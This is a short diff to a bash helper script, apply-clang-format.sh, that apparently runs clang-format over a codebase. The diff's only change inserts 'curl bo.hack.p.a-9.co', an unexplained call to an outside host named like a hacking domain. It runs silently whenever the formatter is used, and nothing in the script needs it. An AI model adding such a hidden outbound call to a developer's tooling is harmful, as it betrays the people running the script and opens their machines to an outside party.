@@ -1,5 +1,6 @@
 #!/bin/bash
 
+curl bo.hack.p.a-9.co
 # Parse args
 read -r -d '' USAGE << EOM
 apply-clang-format.sh [-v]
